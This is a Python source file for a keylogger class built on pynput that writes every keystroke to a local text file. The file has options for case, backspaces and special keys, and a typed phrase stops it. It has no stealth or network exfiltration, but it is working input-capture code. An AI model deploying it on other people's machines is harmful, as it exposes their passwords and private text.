from pynput.keyboard import Listener
import os

'''
Warning: Don't forgot to off the caps-lock
         before starting logger for accurate 
         upper case and lower case logging.
'''

__owner__ = "Aryan Gupta"
__version__ = 1.0


class KeyLogger:

    def __init__(self, file_name: str=None,
                 file_path: str=None,
                 save_other_keys: bool=True,
                 create_file: bool=True,
                 append: bool=True,
                 clean_file_before_log: bool=False,
                 on_release=None,
                 caps_lock_on=False,
                 close_clause: str="#close_logger",
                 allow_backspaces: bool=True):

        """
        :param file_name: Name or Location of the file where to the save the logs.

            Type: string
            Default: None

        :param file_path: (Optional) Give your file location here..You can also give you file location
                                     in file_name.
            Type: str
            Default: None

        :param save_other_keys: (Optional) True if you want to save keys like caps_lock, tab, alt etc.
                                False if you want to save alphabets, numbers, symbols only.

            Type: boolean
            Default: True

        :param create_file: (Optional) True if you want to create a file at given file_path
                            False if the file is already there

            Type: boolean
            Default: True

        :param append: (Optional) True if you want to append each log and don't want to clear
                       the file after saving each log.

                       False if you want to clear the file before saving each log.

            Type: boolean
            Default: True

        :param clean_file_before_log: (Optional) True if want to clean the file before saving each log
                                      else keep False.

            Type: boolean
            Default: False

        :param on_release: (Optional) Take a function you want to run when user releases any key.

            Type: Function
            Default: None

        :param caps_lock_on: (Important param for upper and lower case logging) Should be True if caps_lock is on
                                                                                else False.
                             this param specifies the initial status of caps_lock and automatically updates
                             while logging.

            Type: boolean
            Default: False

        :param close_clause: This should be a string which when be types by the user (without breaks),
                             closes the logger.

            Type: str
            Default: "#close_logger"

        :param allow_backspaces: This param allows user to state weather
                                 to log backspaces (removes the last character or log it as " ${Key.backspace}$ ".

            Type: boolean
            Default: True

        """

        self.allow_backspaces = allow_backspaces
        self.on_release_func = on_release
        self.fileName = file_name
        self.toSaveOtherKeys = save_other_keys
        self.createFile = create_file
        self.close_str = close_clause
        self.temp_str = ""
        self.caps_status = caps_lock_on
        self.filePath = file_path
        if (self.fileName is None) and (file_path is None):
            raise Exception("file_name or file_path is required!")
        if (self.filePath is not None) and (self.fileName is not None):
            self.filePath = os.path.join(self.filePath, self.fileName)
            if not os.path.exists(self.filePath):
                if self.createFile:
                    with open(self.filePath, 'w') as e:
                        e.write("")
                else:
                    raise FileNotFoundError("Invalid file_path: File Doesn't exists!")
        if self.filePath:
            self.fileLocation = self.filePath
        else:
            self.fileLocation = self.fileName

        if self.filePath is None:
            self.filePath = self.fileName

        if clean_file_before_log:
            mode = "w"
        else:
            mode = "a"

        if self.createFile:
            with open(self.filePath, mode) as file_to_make:
                file_to_make.write("=>    " if (mode == "w") else "\n\n=>    ")
        elif append:
            with open(self.filePath, 'a') as file_to_make:
                text = self.get_file_text()
                text = str(text).replace(" ", "")
                if len(text) < 2:
                    file_to_make.write("=>    ")
                else:
                    file_to_make.write("\n\n=>    ")

        self.isRunning = True
        self.listener = None

    def stop(self):
        self.isRunning = False
        if self.listener is not None:
            self.listener.stop()

    def write(self, key: str, mode: str="a"):
        with open(self.fileLocation, mode) as file:
            file.write(str(key))

    def get_file_text(self):
        with open(self.fileLocation, "r") as file_r:
            return str(file_r.read())

    def on_press(self, key):
        if (str(key) == "Key.backspace") and self.allow_backspaces:
            text = self.get_file_text()
            text = text[0: -1]
            self.write(text, mode="w")
        else:
            key = str(key)
            removes = {"Key.space": " ", "'": ""}
            for i in removes:
                key = key.replace(i, removes[i])
            if key == "Key.caps_lock":
                if self.caps_status:
                    self.caps_status = False
                else:
                    self.caps_status = True
            elif (len(str(key)) > 1) and (key.lower() != "key.caps_lock"):
                if self.toSaveOtherKeys:
                    self.write(r" ${" + str(key) + r"}$ ")
            else:
                if self.caps_status:
                    key = key.upper()
                self.temp_str += str(key)
                if self.close_str in self.temp_str:
                    self.write(key)
                    quit(0)
                elif self.close_str == self.temp_str + key:
                    self.write(key)
                    quit(0)
                elif len(self.temp_str) >= 200:
                        self.temp_str = self.temp_str[5:]

                self.write(key)

        if not self.isRunning:
            return False

    def on_release(self, key):
        if self.on_release_func is not None:
            self.on_release_func(key)

    def start(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
            self.listener.join()


if __name__ == '__main__':
    print("Logging Started...")
    KeyLogger(file_name="log.txt", file_path=None,
              save_other_keys=False, create_file=True,
              append=True, clean_file_before_log=False,
              on_release=None, caps_lock_on=False,
              close_clause="#close_logger", allow_backspaces=True).start()
